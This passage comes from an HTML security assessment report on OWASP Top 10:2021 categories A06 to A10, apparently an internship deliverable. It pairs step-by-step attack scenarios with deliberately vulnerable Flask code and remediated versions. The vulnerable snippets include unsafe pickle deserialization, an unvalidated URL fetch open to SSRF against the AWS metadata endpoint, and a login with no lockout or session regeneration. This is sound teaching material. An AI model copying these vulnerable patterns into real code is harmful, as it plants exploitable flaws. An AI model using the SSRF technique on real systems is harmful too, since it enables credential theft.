+2. Attacker cross-references the version against public vulnerability databases (NVD, GitHub Advisory Database) and finds a published CVE with a known, weaponized exploit for that exact version — for example, an outdated deserialization library with a documented remote code execution gadget chain.
+3. Attacker sends a single crafted request containing the malicious serialized payload to any endpoint that deserializes user-controllable input using the vulnerable library.
+4. The deserialization process executes attacker-controlled code on the server before any application-level authentication or authorization check ever runs, because the vulnerability exists below the application logic layer.
+5. Attacker achieves full remote code execution and pivots to internal network reconnaissance — a compromise that required zero custom exploit development, only knowledge of the outdated component's version number.</p>
+<p><strong>Vulnerable Configuration Example</strong></p>
+<pre><code class="language-json">// package.json — pinned to a known-vulnerable major version, never updated
+{
+  &quot;dependencies&quot;: {
+    &quot;lodash&quot;: &quot;4.17.4&quot;,
+    &quot;log4js&quot;: &quot;2.3.0&quot;
+  }
+}
+</code></pre>
+<pre><code># No automated dependency scanning in CI pipeline
+# No Software Bill of Materials (SBOM) generated
+# No alerting on newly disclosed CVEs affecting in-use packages
+</code></pre>
+<p><strong>Remediation &amp; Secure Coding Practice</strong></p>
+<pre><code class="language-yaml"># Remediated — CI pipeline step enforcing dependency scanning
+- name: Dependency Vulnerability Scan
+  run: |
+    npm audit --audit-level=high
+    # or: pip-audit / safety check for Python
+    # or: trivy fs . / grype for container images and SBOMs
+  # Pipeline fails the build on any High/Critical finding
+</code></pre>
+<ul>
+<li>Maintain an accurate, automated <strong>inventory of all dependencies</strong>, including transitive ones — generate a Software Bill of Materials (SBOM) as part of the build process.</li>
+<li>Integrate automated vulnerability scanning (<code>npm audit</code>, <code>pip-audit</code>, Snyk, Dependabot, Trivy, Grype) into CI/CD, gating merges/deploys on High and Critical findings.</li>
+<li>Subscribe to security advisories for all core frameworks and critical dependencies, and establish a <strong>patch SLA</strong> proportional to severity (e.g., Critical CVEs patched within 48–72 hours).</li>
+<li>Remove unused dependencies and features to reduce the total attack surface — the safest vulnerable component is the one that was never included.</li>
+<li>Only pull dependencies from official, verified package registries, and verify package integrity (checksums/signatures) where supported.</li>
+</ul>
+<p><strong>CWE Mapping:</strong> CWE-1104 (Use of Unmaintained Third Party Components), CWE-937 (Using Components with Known Vulnerabilities)</p>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Rating</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Typical CVSS</td>
+<td>Inherited directly from the underlying component's CVE — can reach 10.0 (Critical)</td>
+</tr>
+<tr>
+<td>Exploitability</td>
+<td>Often very low complexity — public exploit code frequently available for known CVEs</td>
+</tr>
+<tr>
+<td>Prevalence</td>
+<td>Extremely common given the scale of modern dependency trees</td>
+</tr>
+</tbody>
+</table>
+<h3 id="a072021-identification-and-authentication-failures">A07:2021 — Identification and Authentication Failures</h3>
+<p><strong>Technical Definition</strong>
+This category (formerly "Broken Authentication") covers weaknesses in how an application confirms user identity and maintains session state: permitting weak or default passwords, lacking protection against credential stuffing and brute-force attacks, exposing session identifiers in URLs, failing to invalidate sessions on logout or after a defined idle period, and missing or poorly-implemented multi-factor authentication (MFA).</p>
+<p><strong>Root Cause &amp; Impact</strong>
+Root causes include the absence of rate limiting/account lockout on login endpoints, weak password policy enforcement, session tokens that are predictable or that fail to rotate after privilege changes (e.g., after login, a pre-authentication session ID is reused post-authentication — <strong>session fixation</strong>), and long-lived or non-expiring session tokens. Impact is direct account takeover, which is typically the highest-value outcome for an attacker because it inherits whatever privileges and data access the compromised account already has.</p>
+<p><strong>Real-World Attack Scenario — Credential Stuffing</strong>
+1. Attacker obtains a large breach-derived list of email/password pairs from an unrelated prior breach (via dark-web marketplaces or public dumps).
+2. Attacker scripts automated login attempts against the target application's login endpoint using the breached credential pairs, at high volume, because the login endpoint has no rate limiting, CAPTCHA, or account lockout.
+3. A percentage of users (historically 0.1–2% in documented credential-stuffing campaigns) reused the same password on this application as on the breached service.
+4. Attacker's automation flags the successful logins and begins systematically taking over those accounts.
+5. Because the application has no anomaly detection (new-device/new-geography login without notification), account owners have no immediate signal that a takeover has occurred.</p>
+<p><strong>Real-World Attack Scenario — Session Fixation</strong>
+1. Attacker visits the target site pre-authentication and obtains a valid but unauthenticated session ID (e.g., <code>SESSIONID=abc123</code>).
+2. Attacker sends the victim a phishing link that pre-sets this same session ID in the victim's browser (via a URL parameter the application improperly accepts, or a subdomain-scoped cookie).
+3. Victim logs in normally; because the application does not <strong>regenerate</strong> the session ID upon successful authentication, the session <code>abc123</code> is now authenticated <strong>as the victim</strong>.
+4. Attacker, already holding <code>abc123</code>, is now also authenticated as the victim in a separate browser session — full account access without ever obtaining the victim's password.</p>
+<p><strong>Vulnerable Code Example</strong></p>
+<pre><code class="language-python"># Vulnerable — no rate limiting, no lockout, session ID unchanged after login
+@app.route(&quot;/login&quot;, methods=[&quot;POST&quot;])
+def login():
+    user = authenticate(request.form[&quot;username&quot;], request.form[&quot;password&quot;])
+    if user:
+        session[&quot;user_id&quot;] = user.id   # reuses existing pre-auth session ID
+        return redirect(&quot;/dashboard&quot;)
+    return &quot;Invalid credentials&quot;, 401
+</code></pre>
+<p><strong>Remediation &amp; Secure Coding Practice</strong></p>
+<pre><code class="language-python"># Remediated — rate limiting, lockout, and session regeneration on login
+@limiter.limit(&quot;5 per minute&quot;)
+@app.route(&quot;/login&quot;, methods=[&quot;POST&quot;])
+def login():
+    username = request.form[&quot;username&quot;]
+    if is_locked_out(username):
+        return &quot;Account temporarily locked&quot;, 429
+
+    user = authenticate(username, request.form[&quot;password&quot;])
+    if user:
+        record_login_success(username)
+        session.clear()                 # invalidate any pre-auth session data
+        session.regenerate()            # issue a brand-new session ID post-auth
+        session[&quot;user_id&quot;] = user.id
+        return redirect(&quot;/dashboard&quot;)
+
+    record_login_failure(username)      # feeds lockout threshold
+    return &quot;Invalid credentials&quot;, 401
+</code></pre>
+<ul>
+<li>Enforce <strong>rate limiting and progressive account lockout</strong> (or CAPTCHA challenge) on authentication endpoints to blunt automated credential stuffing and brute-force attacks.</li>
+<li>Regenerate the session identifier immediately upon successful authentication and any privilege change, and enforce absolute and idle session timeouts.</li>
+<li>Require <strong>multi-factor authentication (MFA)</strong>, particularly for privileged/administrative accounts, and offer it to all users.</li>
+<li>Check submitted passwords against known-breached password lists (e.g., via the Have I Been Pwned Passwords API) at registration and password-change time, in addition to complexity rules.</li>
+<li>Use secure, <code>HttpOnly</code>, <code>Secure</code>, and <code>SameSite=Strict</code> (or <code>Lax</code>) attributes on session cookies, and never transmit session identifiers in URL query strings.</li>
+</ul>
+<p><strong>CWE Mapping:</strong> CWE-287 (Improper Authentication), CWE-384 (Session Fixation), CWE-307 (Improper Restriction of Excessive Authentication Attempts)</p>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Rating</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Typical CVSS</td>
+<td>7.5–9.8 (High–Critical) given direct account-takeover impact</td>
+</tr>
+<tr>
+<td>Exploitability</td>
+<td>Low complexity, heavily automatable</td>
+</tr>
+<tr>
+<td>Prevalence</td>
+<td>Very common, especially credential stuffing given the scale of prior public breaches</td>
+</tr>
+</tbody>
+</table>
+<h3 id="a082021-software-and-data-integrity-failures">A08:2021 — Software and Data Integrity Failures</h3>
+<p><strong>Technical Definition</strong>
+This category, new in 2021, addresses failures to verify the <strong>integrity</strong> of software updates, critical data, and CI/CD pipelines before trusting or executing them. It includes insecure deserialization (making a comeback here rather than as its own 2017 category), auto-update mechanisms that fetch and apply code without signature verification, and CI/CD pipelines with insufficient access controls that allow unauthorized code to enter the build/release process.</p>
+<p><strong>Root Cause &amp; Impact</strong>
+Root cause is trusting data or code from a source (a serialized object, an update package, a build artifact) <strong>without cryptographically verifying it has not been tampered with</strong>. Impact for insecure deserialization is typically remote code execution, since many serialization formats (Java's native serialization, Python's <code>pickle</code>) allow object reconstruction to trigger arbitrary method calls as a side effect of deserializing attacker-controlled data. Impact for CI/CD pipeline integrity failures is supply-chain compromise — malicious code inserted at the build stage is trusted and distributed to every downstream consumer of that software, as demonstrated by high-profile real-world supply-chain attacks (e.g., SolarWinds).</p>
+<p><strong>Real-World Attack Scenario</strong>
+1. Attacker identifies an API endpoint that accepts a serialized object (Python <code>pickle</code>, Java <code>ObjectInputStream</code>, PHP <code>unserialize()</code>) from user input — for example, a "remember me" cookie storing a pickled user-preferences object.
+2. Attacker crafts a malicious serialized payload containing a <strong>gadget chain</strong>: a sequence of legitimate class method calls, present in existing libraries on the target, that when triggered in sequence during deserialization result in execution of an attacker-chosen OS command.
+3. Attacker submits the crafted payload as the "remember me" cookie value.
+4. The server deserializes the cookie to reconstruct the object, and in doing so, unintentionally executes the gadget chain, running the attacker's command with the privileges of the application process.
+5. Separately, in a CI/CD integrity failure: an attacker with write access to a low-privilege internal repository injects a malicious build step into a shared pipeline template, which is then inherited by dozens of downstream production pipelines that trust the template without independent code review — a single compromised template becomes a fleet-wide backdoor.</p>
+<p><strong>Vulnerable Code Example</strong></p>
+<pre><code class="language-python"># Vulnerable — deserializing untrusted user input with pickle
+import pickle
+
+@app.route(&quot;/preferences&quot;)
+def load_preferences():
+    raw = request.cookies.get(&quot;prefs&quot;)
+    prefs = pickle.loads(base64.b64decode(raw))   # executes arbitrary code on load
+    return render_template(&quot;prefs.html&quot;, prefs=prefs)
+</code></pre>
+<p><strong>Remediation &amp; Secure Coding Practice</strong></p>
+<pre><code class="language-python"># Remediated — use a data-only serialization format, never a code-executing one
+import json
+
+@app.route(&quot;/preferences&quot;)
+def load_preferences():
+    raw = request.cookies.get(&quot;prefs&quot;)
+    prefs = json.loads(base64.b64decode(raw))     # pure data, no method execution
+    validate_preferences_schema(prefs)            # explicit schema validation
+    return render_template(&quot;prefs.html&quot;, prefs=prefs)
+</code></pre>
+<ul>
+<li>Never deserialize untrusted input using formats capable of arbitrary object/method reconstruction (Python <code>pickle</code>, Java native serialization, PHP <code>unserialize</code>) — use data-only formats (JSON, Protocol Buffers) with explicit schema validation instead.</li>
+<li>Verify <strong>digital signatures and checksums</strong> on all software updates and build artifacts before applying or executing them.</li>
+<li>Enforce branch protection, mandatory code review, and least-privilege access controls on all CI/CD pipeline configuration — treat pipeline definitions with the same scrutiny as production code, since they have production-equivalent reach.</li>
+<li>Generate and verify a Software Bill of Materials (SBOM) at build time to establish a trusted, auditable provenance chain for every release artifact.</li>
+<li>Isolate and sandbox any process that must handle deserialization of external data, limiting the blast radius if a gadget chain is successfully triggered.</li>
+</ul>
+<p><strong>CWE Mapping:</strong> CWE-502 (Deserialization of Untrusted Data), CWE-494 (Download of Code Without Integrity Check)</p>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Rating</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Typical CVSS</td>
+<td>8.1–9.8 (High–Critical), frequently yields direct RCE</td>
+</tr>
+<tr>
+<td>Exploitability</td>
+<td>Medium complexity — requires knowledge of available gadget chains in the target's libraries</td>
+</tr>
+<tr>
+<td>Prevalence</td>
+<td>Growing concern, particularly around software supply-chain and CI/CD attack surface</td>
+</tr>
+</tbody>
+</table>
+<h3 id="a092021-security-logging-and-monitoring-failures">A09:2021 — Security Logging and Monitoring Failures</h3>
+<p><strong>Technical Definition</strong>
+This category covers the absence, insufficiency, or mishandling of logging and monitoring capabilities needed to <strong>detect, escalate, and respond to</strong> active attacks. Unlike the other nine categories, this one does not itself grant an attacker initial access — its impact is entirely about how long an attacker, once inside, remains undetected, and how effectively the organization can investigate and respond after the fact.</p>
+<p><strong>Root Cause &amp; Impact</strong>
+Root causes include: not logging security-relevant events (failed logins, access-control failures, input validation failures, high-value transactions); logs that are generated but never reviewed or alerted on; logs stored only locally on the compromised host (allowing an attacker to delete evidence of their own activity); and logging sensitive data (passwords, full session tokens, PII) in plaintext, which turns the logging system itself into a data-exposure risk. Documented industry breach data consistently shows median attacker dwell time — the time between initial compromise and detection — measured in <strong>weeks to months</strong> where logging and monitoring are inadequate, during which an attacker has ample time to escalate privileges, exfiltrate data, and establish persistence.</p>
+<p><strong>Real-World Attack Scenario</strong>
+1. Attacker performs a slow, low-and-slow credential-stuffing campaign against the login endpoint, deliberately staying under any simplistic per-minute rate-limit threshold.
+2. Because failed login attempts are not logged with sufficient detail (no source IP, no username, no timestamp correlation) and no alerting rule exists for anomalous failure volume, the campaign runs undetected for weeks.
+3. Attacker eventually succeeds on a handful of accounts and begins exfiltrating data in small batches, again staying under any naive volume-based detection threshold.
+4. Because logs are stored only on the application server itself (no centralized, immutable log aggregation), when the attacker later escalates privileges and gains shell access, they delete the local log files, destroying the only record of the initial compromise.
+5. The breach is only discovered months later when stolen data appears for sale, and the incident response team has no forensic trail to reconstruct the attacker's initial entry point, full scope of access, or exfiltrated data — turning what could have been a contained incident into an open-ended, high-uncertainty breach investigation.</p>
+<p><strong>Vulnerable Configuration Example</strong></p>
+<pre><code class="language-python"># Vulnerable — no structured logging of security events, no alerting
+@app.route(&quot;/login&quot;, methods=[&quot;POST&quot;])
+def login():
+    user = authenticate(request.form[&quot;username&quot;], request.form[&quot;password&quot;])
+    if user:
+        session[&quot;user_id&quot;] = user.id
+        return redirect(&quot;/dashboard&quot;)
+    return &quot;Invalid credentials&quot;, 401   # failure is silent — nothing logged
+</code></pre>
+<p><strong>Remediation &amp; Secure Coding Practice</strong></p>
+<pre><code class="language-python"># Remediated — structured, centralized security event logging
+@app.route(&quot;/login&quot;, methods=[&quot;POST&quot;])
+def login():
+    username = request.form[&quot;username&quot;]
+    src_ip = request.remote_addr
+    user = authenticate(username, request.form[&quot;password&quot;])
+
+    if user:
+        security_log.info(&quot;auth.success&quot;, user=username, src_ip=src_ip)
+        session.clear(); session.regenerate()
+        session[&quot;user_id&quot;] = user.id
+        return redirect(&quot;/dashboard&quot;)
+
+    security_log.warning(&quot;auth.failure&quot;, user=username, src_ip=src_ip)
+    # Forwarded to a centralized SIEM (e.g., Splunk, ELK, Sentinel)
+    # with an alerting rule on failure-rate anomalies per user/IP
+    return &quot;Invalid credentials&quot;, 401
+</code></pre>
+<ul>
+<li>Log all security-relevant events with sufficient context (who, what, when, from where, outcome) — authentication events, authorization failures, input validation failures, and administrative actions at minimum.</li>
+<li>Ship logs to a <strong>centralized, write-once (immutable) log aggregation system</strong> (SIEM) separate from the application host, so an attacker who compromises the host cannot erase the evidence trail.</li>
+<li>Build and tune <strong>alerting rules</strong> for known attack patterns (authentication failure spikes, privilege escalation, mass data export) rather than only collecting logs passively for after-the-fact forensic review.</li>
+<li>Never log sensitive data in plaintext (passwords, full tokens, full card numbers) — mask or omit these fields at the point of log generation.</li>
+<li>Establish and rehearse an <strong>incident response plan</strong>, including defined escalation paths, so that when monitoring does raise an alert, the organization can act on it quickly rather than discovering the alert unread weeks later.</li>
+</ul>
+<p><strong>CWE Mapping:</strong> CWE-778 (Insufficient Logging), CWE-117 (Improper Output Neutralization for Logs)</p>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Rating</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Typical CVSS</td>
+<td>Generally rated as a contributing/amplifying factor rather than a standalone exploit (context-dependent, often 3.0–5.0)</td>
+</tr>
+<tr>
+<td>Exploitability</td>
+<td>Not directly exploitable — enables extended dwell time for other exploited vulnerabilities</td>
+</tr>
+<tr>
+<td>Prevalence</td>
+<td>Common, particularly in organizations without a dedicated security operations function</td>
+</tr>
+</tbody>
+</table>
+<h3 id="a102021-server-side-request-forgery-ssrf">A10:2021 — Server-Side Request Forgery (SSRF)</h3>
+<p><strong>Technical Definition</strong>
+SSRF occurs when an application fetches a remote resource (an image, a webhook callback, a document preview) using a URL that is influenced, directly or indirectly, by user input — without validating that the resulting request is actually going somewhere the application intends to trust. This allows an attacker to coerce the server itself into making requests to internal-only endpoints, cloud metadata services, or other systems that are not reachable from the public internet but <em>are</em> reachable from the server's own network position.</p>
+<p><strong>Root Cause &amp; Impact</strong>
+Root cause is treating a user-supplied URL as trustworthy simply because the <em>request</em> originates from the trusted application server, without validating the <em>destination</em> against an allow-list or blocking access to internal/private IP ranges. Impact includes disclosure of internal network topology, access to internal-only administrative services with no separate authentication, and — most severely in cloud environments — theft of temporary cloud credentials from the instance metadata service (e.g., AWS <code>169.254.169.254</code>), which frequently grants the attacker broad access to the victim's entire cloud account.</p>
+<p><strong>Real-World Attack Scenario</strong>
+1. Attacker locates a feature that fetches a remote URL on the server's behalf — for example, an "import avatar from URL" feature or a webhook/URL-preview generator.
+2. Instead of a legitimate image URL, the attacker submits <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>, the AWS EC2 instance metadata endpoint, which is reachable only from within the instance's own network but is exactly where the vulnerable server is making its request from.
+3. The server, trusting the URL as a normal external fetch, makes the request and returns the response content (temporary IAM credentials) back to the attacker, either directly in the rendered output or via an observable timing/error-based side channel.
+4. Attacker uses the stolen temporary AWS credentials with the AWS CLI/SDK to enumerate and access other cloud resources the compromised instance's IAM role has permission to reach — S3 buckets, other EC2 instances, databases — potentially achieving full cloud account compromise from a single unvalidated URL field.
+5. In a variant of this attack, the attacker instead targets an internal admin panel at <code>http://10.0.0.5:8080/admin</code> that has no authentication because it was assumed to be unreachable from outside the private network — the SSRF-vulnerable server becomes an unwitting proxy that bypasses this network-level assumption entirely.</p>
+<p><strong>Vulnerable Code Example</strong></p>
+<pre><code class="language-python"># Vulnerable — fetches any URL supplied by the user with no destination validation
+@app.route(&quot;/import-avatar&quot;, methods=[&quot;POST&quot;])
+def import_avatar():
+    url = request.form[&quot;image_url&quot;]
+    response = requests.get(url)          # server-side fetch of attacker-controlled URL
+    save_avatar(response.content)
+    return &quot;Avatar imported&quot;, 200
+</code></pre>
+<p><strong>Remediation &amp; Secure Coding Practice</strong></p>
+<pre><code class="language-python">import ipaddress, socket
+from urllib.parse import urlparse
+
+ALLOWED_SCHEMES = {&quot;https&quot;}
+BLOCKED_NETWORKS = [
+    ipaddress.ip_network(&quot;169.254.0.0/16&quot;),   # link-local / cloud metadata
+    ipaddress.ip_network(&quot;10.0.0.0/8&quot;),       # private ranges
+    ipaddress.ip_network(&quot;172.16.0.0/12&quot;),
+    ipaddress.ip_network(&quot;192.168.0.0/16&quot;),
+    ipaddress.ip_network(&quot;127.0.0.0/8&quot;),
+]
+
+def is_safe_url(url: str) -&gt; bool:
+    parsed = urlparse(url)
+    if parsed.scheme not in ALLOWED_SCHEMES:
+        return False
+    resolved_ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
+    return not any(resolved_ip in net for net in BLOCKED_NETWORKS)
+
+@app.route(&quot;/import-avatar&quot;, methods=[&quot;POST&quot;])
+def import_avatar():
+    url = request.form[&quot;image_url&quot;]
+    if not is_safe_url(url):
+        abort(400, &quot;URL destination is not permitted&quot;)
+    response = requests.get(url, timeout=5, allow_redirects=False)  # no redirect-based bypass
+    save_avatar(response.content)
+    return &quot;Avatar imported&quot;, 200
+</code></pre>
+<ul>
+<li>Validate the <strong>resolved destination IP</strong>, not just the URL string, against a strict deny-list of private/link-local/loopback ranges and the cloud metadata address — validating the string alone is bypassable via DNS rebinding and redirects.</li>
+<li>Prefer an <strong>allow-list</strong> of specifically permitted destination domains for any feature that must fetch external resources, rather than attempting to deny-list all bad destinations.</li>
+<li>Disable HTTP redirect-following on server-side fetch requests, or re-validate the destination after every redirect hop, since an initially-safe URL can redirect to an internal address.</li>
+<li>At the infrastructure/network layer, block cloud metadata endpoint access from application workloads that don't explicitly require it, and require the newer, more SSRF-resistant metadata service versions (e.g., AWS IMDSv2, which requires a session token obtainable only via a non-forwardable PUT request).</li>
+<li>Run server-side fetch operations from a network-segmented, egress-restricted proxy or sandboxed environment with no route to internal services, rather than directly from the main application host.</li>
+</ul>
+<p><strong>CWE Mapping:</strong> CWE-918 (Server-Side Request Forgery)</p>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Rating</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Typical CVSS</td>
+<td>7.5–9.8 (High–Critical), especially in cloud environments where metadata credential theft is possible</td>
+</tr>
+<tr>
+<td>Exploitability</td>
+<td>Low-to-medium complexity; well-documented technique against common cloud metadata endpoints</td>
+</tr>
+<tr>
+<td>Prevalence</td>
+<td>Increasing with cloud adoption; newly promoted into the Top 10 in the 2021 revision</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="risk-summary-table">Risk Summary Table</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Category</th>
+<th>Typical CVSS Range</th>
+<th>Primary Impact</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>A01</td>
+<td>Broken Access Control</td>
+<td>6.5–8.1</td>
+<td>Unauthorized data access / privilege escalation</td>
+</tr>
+<tr>
+<td>A02</td>
+<td>Cryptographic Failures</td>
+<td>7.5–9.1</td>
+<td>Credential/PII exposure, offline cracking</td>
+</tr>
+<tr>
+<td>A03</td>
+<td>Injection (incl. XSS)</td>
+<td>5.0–9.8</td>
+<td>Data breach, auth bypass, session hijack</td>
+</tr>
+<tr>
+<td>A04</td>
+<td>Insecure Design</td>
+<td>4.0–9.0</td>
+<td>Business-logic abuse, financial loss</td>
+</tr>
+<tr>
+<td>A05</td>
+<td>Security Misconfiguration</td>
+<td>5.3–9.8</td>
+<td>Info disclosure, RCE via debug interfaces</td>
+</tr>
+<tr>
+<td>A06</td>
+<td>Vulnerable &amp; Outdated Components</td>
+<td>up to 10.0</td>
+<td>Inherited RCE from known CVEs</td>
+</tr>
+<tr>
+<td>A07</td>
+<td>Identification &amp; Authentication Failures</td>
+<td>7.5–9.8</td>
+<td>Account takeover</td>
+</tr>
+<tr>
+<td>A08</td>
+<td>Software &amp; Data Integrity Failures</td>
+<td>8.1–9.8</td>
+<td>RCE via deserialization, supply-chain compromise</td>
+</tr>
+<tr>
+<td>A09</td>
+<td>Security Logging &amp; Monitoring Failures</td>
+<td>3.0–5.0</td>
+<td>Extended attacker dwell time, hindered response</td>
+</tr>
+<tr>
+<td>A10</td>
+<td>Server-Side Request Forgery</td>
+<td>7.5–9.8</td>
+<td>Internal network/cloud credential exposure</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="cross-cutting-recommendations">Cross-Cutting Recommendations</h2>
+<p>The ten categories above share common root-cause patterns, and addressing them at the process level is more durable than patching individual findings one at a time.</p>
+<h3 id="1-shift-security-left-in-the-sdlc">1. Shift Security Left in the SDLC</h3>
+<ul>
+<li>Integrate <strong>threat modeling</strong> into design reviews for any feature touching authentication, authorization, payments, or PII — before implementation begins (directly addresses A04).</li>
+<li>Provide developers with <strong>secure-by-default libraries and internal frameworks</strong> for common risk areas (auth, session management, DB access, HTTP clients) so individual engineers are not re-solving cryptography or access-control problems from scratch.</li>
+</ul>
+<h3 id="2-automate-security-testing-in-cicd">2. Automate Security Testing in CI/CD</h3>
+<ul>
+<li><strong>SAST (Static Application Security Testing):</strong> scan source code on every pull request for injection patterns, hardcoded secrets, and insecure API usage (addresses A02, A03, A08).</li>
+<li><strong>DAST (Dynamic Application Security Testing):</strong> run automated scans against staging environments to catch runtime misconfigurations and missing headers (addresses A05).</li>
+<li><strong>SCA (Software Composition Analysis):</strong> scan dependency manifests on every build, gating merges on High/Critical CVEs in third-party components, and generate an SBOM per release (addresses A06, A08).</li>
+<li>Treat all three as <strong>build-breaking gates</strong>, not advisory reports that get ignored — a scan result nobody reads provides no risk reduction.</li>
+</ul>
+<h3 id="3-enforce-security-headers-and-transport-hardening-fleet-wide">3. Enforce Security Headers and Transport Hardening Fleet-Wide</h3>
+<ul>
+<li>Standardize <code>Content-Security-Policy</code>, <code>Strict-Transport-Security</code>, <code>X-Content-Type-Options</code>, <code>X-Frame-Options</code>, and <code>Referrer-Policy</code> at the load balancer/API gateway layer so every service inherits them by default rather than depending on each team to configure them correctly (addresses A03, A05).</li>
+<li>Enforce TLS 1.2+ everywhere, with automatic redirect from HTTP to HTTPS and HSTS preload where appropriate (addresses A02).</li>
+</ul>
+<h3 id="4-centralize-identity-access-and-secrets-management">4. Centralize Identity, Access, and Secrets Management</h3>
+<ul>
+<li>Route all authentication through a centralized identity provider supporting MFA, rather than allowing individual services to implement bespoke login logic (addresses A07).</li>
+<li>Store all credentials, API keys, and encryption keys in a dedicated secrets manager with audit logging and automated rotation — never in source control or environment files committed to a repository (addresses A02, A05).</li>
+</ul>
+<h3 id="5-establish-continuous-patch-management">5. Establish Continuous Patch Management</h3>
+<ul>
+<li>Maintain an inventory of all runtime components (OS packages, language runtimes, frameworks, container base images) with automated notification of newly disclosed CVEs affecting anything in the inventory.</li>
+<li>Define severity-based patch SLAs (e.g., Critical: 48–72 hours, High: 7 days, Medium: 30 days) and track compliance against them as an operational metric, not just a one-time audit item (addresses A06).</li>
+</ul>
+<h3 id="6-build-real-detection-and-response-capability">6. Build Real Detection and Response Capability</h3>
+<ul>
+<li>Centralize logs from all services into a SIEM with defined alerting rules for authentication anomalies, authorization failures, and abnormal data-access volume.</li>
+<li>Rehearse incident response with tabletop exercises so that when an alert fires, the response is fast and well-rehearsed rather than improvised (addresses A09).</li>
+</ul>
+<h3 id="7-make-this-a-recurring-program-not-a-point-in-time-audit">7. Make This a Recurring Program, Not a Point-in-Time Audit</h3>
+<p>The OWASP Top 10 is revised roughly every 3–4 years based on new aggregated data, and an application's own risk profile shifts continuously as new features ship. A single assessment — including this one — establishes a baseline; it does not establish permanent assurance. Recommend a recurring cadence of automated scanning (continuous), internal review (quarterly), and third-party penetration testing (at minimum annually, or after any major architectural change).</p>
+<hr />
+<h2 id="conclusion-internship-deliverable-sign-off">Conclusion &amp; Internship Deliverable Sign-off</h2>
+<p>This report has documented all ten categories of the OWASP Top 10:2021 framework, providing for each: the technical mechanism of the flaw, its root cause and business impact, a realistic attacker workflow, vulnerable and remediated code examples, and standardized CWE risk mapping. Together with the cross-cutting recommendations above, this material is intended to serve both as a <strong>reference document</strong> for engineering teams building or reviewing web applications, and as a <strong>training artifact</strong> demonstrating internship-cycle competency across the full breadth of the OWASP Top 10 risk categories.</p>
+<p>The core takeaway across all ten categories is consistent: the majority of high-impact web application vulnerabilities trace back to a small set of recurring root causes — missing server-side validation, misplaced trust in client-supplied data, and inadequate visibility into what the application is actually doing at runtime. Addressing these at the process level (secure design review, automated testing gates, centralized identity and secrets management, and real monitoring) is more durable than remediating individual findings in isolation, and is the recommended direction for continued security maturity beyond this assessment.</p>
+<p><strong>Deliverable status:</strong> Complete
+<strong>Prepared as:</strong> Internship Assessment Report — OWASP Top 10:2021 Technical Deep-Dive
+<strong>Next recommended step:</strong> Socialize the Cross-Cutting Recommendations section with engineering leadership and prioritize the SDLC automation items (Section: <em>Automate Security Testing in CI/CD</em>) for the next planning cycle.</p></div>
+</body>
+</html>
